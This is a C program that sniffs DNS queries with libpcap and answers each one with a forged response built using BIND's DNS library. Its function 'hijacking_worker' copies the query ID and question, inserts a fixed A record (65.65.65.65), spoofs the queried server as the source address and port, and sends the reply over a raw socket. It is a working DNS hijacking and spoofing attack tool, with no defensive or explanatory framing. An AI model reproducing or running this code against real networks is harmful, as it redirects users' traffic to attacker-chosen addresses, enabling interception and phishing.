#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <poll.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/if_ether.h>
#include <pthread.h>
#include <time.h>

#include <isc/base64.h>
#include <isc/buffer.h>
#include <isc/commandline.h>
#include <isc/lib.h>
#include <isc/mem.h>
#include <isc/sockaddr.h>
#include <isc/util.h>

#include <dns/client.h>
#include <dns/fixedname.h>
#include <dns/keyvalues.h>
#include <dns/lib.h>
#include <dns/masterdump.h>
#include <dns/message.h>
#include <dns/name.h>
#include <dns/rdata.h>
#include <dns/rdataset.h>
#include <dns/rdatalist.h>
#include <dns/rdatastruct.h>
#include <dns/rdatatype.h>
#include <dns/result.h>
#include <dns/secalg.h>

#include <dst/dst.h>
//#include "bufring.h"
#include "atomic.h"
#include "lfq.h"

#define IPUDPHDRLEN 28

char *program_name;
isc_mem_t *mctx;
//bufring_t *ring;
queue_t *ring;
static const dns_master_style_t *style = &dns_master_style_debug;
struct en2de *enp = NULL;
int rawfd = 0;

struct en2de {
    size_t  len;
    time_t  t;
    struct timeval tm;
    //void *sp[0];
    char *sp;
};

/* Forwards */
void *
hijacking_worker();
static void pcap_callback(u_char *, const struct pcap_pkthdr *, const u_char *);
static void usage(void) __attribute__((noreturn));
static void error(const char *, ...);
static void warning(const char *, ...);
static char *copy_argv(char **);

static pcap_t *pd;

extern int optind;
extern int opterr;
extern char *optarg;

#define CAST_CONST(source, target) \
    do { \
        union {const void *s; void *d;} u; \
        u.s = (source); \
        (target) = u.d;\
    }while(0)

void *
hijacking_worker()
{
    struct en2de *ende;
    u_char *sp;

    isc_buffer_t outbuf;
    char  buff[1024];
    isc_buffer_t source;
    isc_region_t region;
    dns_message_t *query;
    dns_message_t *response = NULL;
    dns_rdataset_t *question = NULL;
    dns_rdataset_t *answer = NULL;
    dns_rdataset_t *addopt = NULL;
    dns_name_t *qname = NULL;
    dns_name_t *tqname = NULL;
    dns_name_t *asname = NULL;
    isc_result_t result;
    char msg[1500];
    isc_buffer_t msgbuf;
    isc_buffer_t respbuf;
    //isc_region_t region;
    dns_compress_t cctx;

    uint32_t phdlen;
    uint32_t datalen;

    struct iphdr iph;
    struct udphdr udph;
    struct ethhdr ethh;

    struct iphdr *iphp;
    struct udphdr *udphp;
    struct ethhdr *ethhp;
    struct ethhdr *ethpt;
    unsigned int payloadlen = 0;


    char nametext[] = "host.example";
    isc_buffer_t namesrc, namedst;
    unsigned char namedata[256];
    char output1[10 * 1024];
    isc_buffer_t outbuf1;

    struct sockaddr_in peer;

    peer.sin_family = AF_INET;

    time_t now; 
    struct tm * oldtmp;
    struct tm * newtmp;

    struct timeval tmnow;

    dns_name_t *tempname = NULL;
    dns_rdata_t *temprdata = NULL;
    dns_rdatalist_t *temprdatalist = NULL;
    dns_rdataset_t *temprdataset = NULL;
    //    while(1) {
    //ende = bufring_dequeue(ring);
    //ende = queue_dequeue(ring);
    ende = enp;
    if(ende != NULL)
    {
        sp = (u_char*)(ende->sp);

        /* ethhp = (struct ethhdr*)(sp);
           iphp = (struct iphdr *)(sp + sizeof(struct ethhdr));
           udphp = (struct udphdr *)(sp + sizeof(struct ethhdr) + sizeof(struct iphdr));

           phdlen = sizeof(struct ethhdr) + sizeof(struct iphdr) +  sizeof(struct udphdr); */
        ethhp = (struct ethhdr*)(sp);
        iphp = (struct iphdr *)(sp + 14);
        udphp = (struct udphdr *)(sp + 14 + 20);

        phdlen = 14 + 20 + 8; 
        datalen = ende->len - phdlen; 
        CAST_CONST(sp+phdlen, region.base);//const to no const, keep gcc happy 
        region.length = datalen;

        isc_buffer_init(&source, region.base, region.length);
        isc_buffer_add(&source, region.length); 

        query = NULL;
        result = dns_message_create(mctx, DNS_MESSAGE_INTENTPARSE, &query);
        if(result != ISC_R_SUCCESS)
        {
            printf("error dns_message_create\n");
            exit(1);
        }

        result = dns_message_parse(query, &source, 0);
        if(result != ISC_R_SUCCESS)
        {
            printf("error dns_message_create\n");
            exit(1);
        }

        if((query->flags & DNS_MESSAGEFLAG_QR) == 0)
        {
        }
        else {
            /* isc_buffer_init(&outbuf, buff, sizeof(buff));
               result = dns_message_totext(query, style, 0, &outbuf);
               printf("%.*s\n", (int)isc_buffer_usedlength(&outbuf), \
               (char *)isc_buffer_base(&outbuf));
               printf("thread_id=%lu ==========\n",pthread_self()); */
        }

        //isc_buffer_init(&msgbuf, msg + sizeof(struct ethhdr), sizeof(msg) - sizeof(struct ethhdr));
        //isc_buffer_init(&msgbuf, msg , sizeof(msg) );
        isc_buffer_init(&msgbuf, msg , 1500);

        //FIrst: render  dns header and sections
        result = dns_message_create(mctx, DNS_MESSAGE_INTENTPARSE, &response);

        response->from_to_wire = DNS_MESSAGE_INTENTRENDER;


        //question section
        /* result = dns_message_gettemprdataset(response, &question);
           dns_rdataset_init(question);
           dns_rdataset_makequestion(question, dns_rdataclass_in,
           dns_rdatatype_a);

           result = dns_message_gettempname(response, &qname);
           isc_buffer_init(&namesrc, nametext, strlen(nametext));
           isc_buffer_add(&namesrc, strlen(nametext));
           isc_buffer_init(&namedst, namedata, sizeof(namedata));
           dns_name_init(qname, NULL);
           result = dns_name_fromtext(qname, &namesrc, dns_rootname, 0, &namedst); */

        result = dns_message_firstname(query, DNS_SECTION_QUESTION);
        //if(result == ISC_R_SUCCESS )
        {
            tqname = NULL;
            qname = NULL;
            question = NULL;
            result = dns_message_gettemprdataset(response, &question);
            dns_rdataset_init(question);
            dns_rdataset_makequestion(question, dns_rdataclass_in,
                dns_rdatatype_a);
            result = dns_message_gettempname(response, &qname);
            dns_name_init(qname, NULL);
            dns_message_currentname(query, DNS_SECTION_QUESTION,&tqname);
            //dns_name_dup(tqname, mctx, qname);
            dns_name_clone(tqname, qname);
            ISC_LIST_APPEND(qname->list, question, link);
            dns_message_addname(response, qname, DNS_SECTION_QUESTION);
        }

        result = dns_compress_init(&cctx, -1, mctx);

        //TODO answer section
        result = dns_message_gettempname(response, &asname);
        dns_name_init(asname, NULL);
        dns_message_gettemprdata(response, &temprdata);

        //result = dns_message_gettemprdataset(response, &answer);
        result = dns_message_gettemprdataset(response, &temprdataset);
        dns_message_gettemprdatalist(response, &temprdatalist);

        dns_name_clone(qname, asname);
        //dns_rdataset_init(answer);
        //dns_rdataset_makequestion(answer, dns_rdataclass_in,
        //   dns_rdatatype_a);

        temprdata->rdclass = dns_rdataclass_in;
        temprdata->type = dns_rdatatype_a;
        temprdata->data = "\x41\x41\x41\x41";
        temprdata->length = 4;
        temprdata->flags = 0;

        temprdatalist->rdclass = temprdata->rdclass;
        temprdatalist->type = temprdata->type;
        temprdatalist->covers = 0;
        temprdatalist->ttl = 5;
        ISC_LIST_INIT(temprdatalist->rdata);
        ISC_LIST_APPEND(temprdatalist->rdata, temprdata, link);
        dns_rdataset_init(temprdataset);
        result = dns_rdatalist_tordataset(temprdatalist, temprdataset);
        //ISC_LIST_APPEND(tempname->list, temprdataset, link);

        ISC_LIST_APPEND(asname->list, temprdataset, link);
        dns_message_addname(response, asname, DNS_SECTION_ANSWER);
        temprdatalist = NULL;
        temprdataset = NULL;
        temprdata = NULL;
        tempname = NULL;
        asname = NULL;


        //additional opt section
        addopt = NULL;
        dns_message_buildopt(response, &addopt, 0, 4096, DNS_MESSAGEEXTFLAG_DO, NULL, 0);
        dns_message_setopt(response, addopt);

        //response->id,response->flags, response->opcode, response->rcode, response->counts
        response->id = query->id;
        //response->flags |= DNS_MESSAGEFLAG_QR;
        response->flags |= 0x8180;


        //isc_buffer_init(&respbuf, msg + IPUDPHDRLEN, sizeof(msg)-IPUDPHDRLEN);
        isc_buffer_init(&respbuf, msg + IPUDPHDRLEN, 1500-IPUDPHDRLEN);
        //isc_buffer_init(&respbuf, msg + sizeof(struct ethhdr)+ IPUDPHDRLEN, sizeof(msg)-IPUDPHDRLEN);
        result = dns_message_renderbegin(response, &cctx, &respbuf);
        //printf(">%d\n",(int)isc_buffer_usedlength(&respbuf));
        result = dns_message_rendersection(response, DNS_SECTION_QUESTION, 0);
        result = dns_message_rendersection(response, DNS_SECTION_ANSWER, 0);
        result = dns_message_rendersection(response, DNS_SECTION_AUTHORITY, 0);
        result = dns_message_rendersection(response, DNS_SECTION_ADDITIONAL, 0);
        result = dns_message_renderend(response);
        //printf(">%d\n",(int)isc_buffer_usedlength(&respbuf));

        payloadlen = respbuf.used;

        //Second: render ip header
        //printf("srcmac=%X:%X:%X:%X:%X:%X, dstmac=%X:%X:%X:%X:%X:%X\n",
        //   ethhp->h_dest[0],ethhp->h_dest[1],ethhp->h_dest[2], ethhp->h_dest[3],ethhp->h_dest[4], ethhp->h_dest[5],
        //  ethhp->h_source[0],ethhp->h_source[1],ethhp->h_source[2], ethhp->h_source[3],ethhp->h_source[4], ethhp->h_source[5]);

        /* ethpt = (struct ethhdr *)(msg);
           memcpy(ethpt->h_dest, ethhp->h_source, ETH_ALEN);
           memcpy(ethpt->h_source, ethhp->h_dest, ETH_ALEN);
           ethpt->h_proto= ethhp->h_proto; */
        isc_buffer_usedregion(&respbuf, &region);


        isc_buffer_putuint8(&msgbuf,0x45); //vhl
        isc_buffer_putuint8(&msgbuf,0x0); //tos
        isc_buffer_putuint16(&msgbuf, payloadlen + 28); // important   tot_len
        isc_buffer_putuint16(&msgbuf,0x0); //id
        isc_buffer_putuint16(&msgbuf,0x0); //frag_off
        isc_buffer_putuint8(&msgbuf,0x40); //ttl
        isc_buffer_putuint8(&msgbuf,IPPROTO_UDP); //protol
        isc_buffer_putuint16(&msgbuf,0x00); //checksum
        isc_buffer_putuint32(&msgbuf,ntohl(iphp->daddr)); //saddr
        isc_buffer_putuint32(&msgbuf,ntohl(iphp->saddr)); //daddr
        //        printf("daddr=%X,saddr=%X\n",iphp->daddr, iphp->saddr);

        //Third: render udp header
        isc_buffer_putuint16(&msgbuf, ntohs(udphp->dest)); //source
        isc_buffer_putuint16(&msgbuf, ntohs(udphp->source)); //dest
        isc_buffer_putuint16(&msgbuf, payloadlen + 8); //import len
        isc_buffer_putuint16(&msgbuf, 0x0); //check


        //sendto region.base region.used

        /* isc_buffer_init(&outbuf1, output1, sizeof(output1));
           result = dns_message_totext(response, style, 0, &outbuf1);
           printf("%d,%d,%d,%s\n", payloadlen,(int)isc_buffer_usedlength(&msgbuf),(int)isc_buffer_usedlength(&respbuf),
           (char *)isc_buffer_base(&outbuf1)); */
        //printf("0x%X,0x%x,0x%x\n", response->id, msg[28], msg[29]);

        /* char srcip[16];
           char dstip[16];
           struct in_addr *saddrp = (struct in_addr *)&(iphp->saddr);
           struct in_addr *daddrp = (struct in_addr *)&(iphp->daddr);

           strcpy(srcip,inet_ntoa(*saddrp));
           strcpy(dstip,inet_ntoa(*daddrp)); */


        //printf("srcip=%s, dstip=%s\n", srcip, dstip);
        peer.sin_port = udphp->source;
        peer.sin_addr.s_addr = iphp->saddr;

        sendto(rawfd, msg, IPUDPHDRLEN+payloadlen, 0,(struct sockaddr*)&peer, sizeof(struct sockaddr_in));
        //pcap_sendpacket(pd, msg, 14+28+payloadlen);


        dns_compress_invalidate(&cctx);
        //dns_rdataset_disassociate(question);
        //dns_message_puttemprdataset(response, &question);
        //dns_message_puttempname(response, &qname);
        dns_message_destroy(&response);
        dns_message_destroy(&query);

        /* now = time(NULL);
           newtmp = localtime(&now);
           oldtmp = localtime(&(ende->t)); */
        gettimeofday(&tmnow, NULL);
        /* printf("old_time %d:%d:%d:%d; new_time %d:%d:%d:%d\n", oldtmp->tm_hour, oldtmp->tm_min, oldtmp->tm_sec,(ende->tm).tv_usec,
           newtmp->tm_hour, newtmp->tm_min, newtmp->tm_sec, tmnow.tv_usec); */
        printf("send timestamp %d:%d\n", tmnow.tv_sec, tmnow.tv_usec);
        //free(ende);
        //ende = NULL;
    }
    //}
}


int main(int argc, char **argv)
{
    register int op;
    int workers = 1;
    bpf_u_int32 localnet, netmask;
    register char *cp, *cmdbuf, *device;
    int dotimeout, dononblock;
    struct bpf_program fcode;
    char ebuf[PCAP_ERRBUF_SIZE];
    int status;
    int on=1;
    int i = 0;
    int ret;
    int count = 0;

    cpu_set_t cpuset;

    struct pcap_pkthdr *pcap_h;


    device = NULL;
    dotimeout = 0;
    dononblock = 0;

    pthread_t tid;
    pthread_attr_t attr;

    if ((cp = strrchr(argv[0], '/')) != NULL)
        program_name = cp + 1;
    else
        program_name = argv[0];

    opterr = 0;
    while ((op = getopt(argc, argv, "i:tn")) != -1) {
        switch (op) {

        case 'i':
            device = optarg;
            break;

        case 't':
            dotimeout = 1;
            break;

        case 'n':
            dononblock = 1;
            break;

        default:
            usage();
            /* NOTREACHED */
        }
    }

    if (dotimeout) {
        fprintf(stderr, "selpolltest: timeout (-t) requires select (-s) or poll (-p)\n");
        return 1;
    }
    if (device == NULL) {
        device = pcap_lookupdev(ebuf);
        if (device == NULL)
            error("%s", ebuf);
    }
    *ebuf = '\0';
    pd = pcap_open_live(device, 128, 1, 0, ebuf);
    if (pd == NULL)
        error("%s", ebuf);
    else if (*ebuf)
        warning("%s", ebuf);
    if (pcap_lookupnet(device, &localnet, &netmask, ebuf) < 0) {
        localnet = 0;
        netmask = 0;
        warning("%s", ebuf);
    }
    cmdbuf = copy_argv(&argv[optind]);

    if (pcap_compile(pd, &fcode, cmdbuf, 0, netmask) < 0)
        error("%s", pcap_geterr(pd));

    if (pcap_setfilter(pd, &fcode) < 0)
        error("%s", pcap_geterr(pd));
    printf("Listening on %s\n", device);

    //pcap_set_buffer_size(pd, 1);

    pcap_setnonblock(pd, 1, NULL);
    rawfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if(rawfd == -1)
    {
        error("%s", "create raw fd"); 
    }

    if(setsockopt(rawfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
    {
        error("%s", "setsocketopt");
    }

    ret = isc_mem_create(0, 0, &mctx);
    if(ret != ISC_R_SUCCESS)
        error("%s", "memory");

    //    ring = bufring_alloc(100, malloc);
    ring = queue_create(2);
    if(ring == NULL)
    {
        isc_mem_destroy(&mctx); 
    }

    CPU_ZERO(&cpuset);
    for(i = 0; i < 4; i++)
    {
        CPU_SET(i, &cpuset) ;
    }
    /* pthread_attr_init(&attr);
       for(i = 0; i < workers; i++)
       {
       pthread_create(&tid, &attr, hijacking_worker, (void*)&rawfd);
       pthread_setaffinity_np(tid, sizeof(cpu_set_t), &cpuset);
       pthread_detach(tid);
       }
       pthread_attr_destroy(&attr);
       pthread_detach(tid); */

    enp = (struct en2de *)malloc(sizeof(struct en2de) + 1500);
    int res;

    while((res =pcap_next_ex(pd, &pcap_h, &(enp->sp))) >= 0 ) {
        if(res == 0)
            continue;
        //printf(">>>>\n");
        //printf("pcap timestamp %d:%d\n", pcap_h->ts.tv_sec, pcap_h->ts.tv_usec);
        gettimeofday(&(enp->tm), NULL); 
        printf("receive timestamp %d:%d\n", enp->tm.tv_sec, enp->tm.tv_usec);
        hijacking_worker();
    }
    if (status == -2) {
        putchar('\n');
    }
    (void)fflush(stdout);
    if (status == -1) {
        /*
         * Error.  Report it.
         */
        (void)fprintf(stderr, "%s: pcap_loop: %s\n",
            program_name, pcap_geterr(pd));
    }
    pcap_close(pd);
    exit(status == -1 ? 1 : 0);
}

static void
pcap_callback(u_char *user, const struct pcap_pkthdr *h, const u_char *sp)
{

    //struct en2de *enp = NULL;
    /* struct timeval temp;
       gettimeofday(&temp, NULL);
       printf("timestamp %d:%d\n", temp.tv_sec, temp.tv_usec); */

    //enp = (struct en2de *)malloc(sizeof(struct en2de) + h->len);

    if(enp != NULL)
    {
        //printf("push queue\n");
        memcpy((u_char*)enp->sp, sp, h->len); 
        //bufring_enqueue(ring, enp);
        //enp->t = time(NULL);
        printf("pcap timestamp %d:%d\n", h->ts.tv_sec, h->ts.tv_usec);
        //gettimeofday(&(enp->tm), NULL);
        //queue_enqueue(ring, enp);
        hijacking_worker();
    }

    int count = (*((int*)user))++;

    count++;
}

static void
usage(void)
{
    (void)fprintf(stderr, "Usage: %s [ -sptn ] [ -i interface ] [expression]\n",
        program_name);
    exit(1);
}

/* VARARGS */
static void
error(const char *fmt, ...)
{
    va_list ap;

    (void)fprintf(stderr, "%s: ", program_name);
    va_start(ap, fmt);
    (void)vfprintf(stderr, fmt, ap);
    va_end(ap);
    if (*fmt) {
        fmt += strlen(fmt);
        if (fmt[-1] != '\n')
            (void)fputc('\n', stderr);
    }
    exit(1);
    /* NOTREACHED */
}

/* VARARGS */
static void
warning(const char *fmt, ...)
{
    va_list ap;

    (void)fprintf(stderr, "%s: WARNING: ", program_name);
    va_start(ap, fmt);
    (void)vfprintf(stderr, fmt, ap);
    va_end(ap);
    if (*fmt) {
        fmt += strlen(fmt);
        if (fmt[-1] != '\n')
            (void)fputc('\n', stderr);
    }
}

/*
 * Copy arg vector into a new buffer, concatenating arguments with spaces.
 */
static char *
copy_argv(register char **argv)
{
    register char **p;
    register u_int len = 0;
    char *buf;
    char *src, *dst;

    p = argv;
    if (*p == 0)
        return 0;

    while (*p)
        len += strlen(*p++) + 1;

    buf = (char *)malloc(len);
    if (buf == NULL)
        error("copy_argv: malloc");

    p = argv;
    dst = buf;
    while ((src = *p++) != NULL) {
        while ((*dst++ = *src++) != '\0')
            ;
        dst[-1] = ' ';
    }
    dst[-1] = '\0';

    return buf;
}
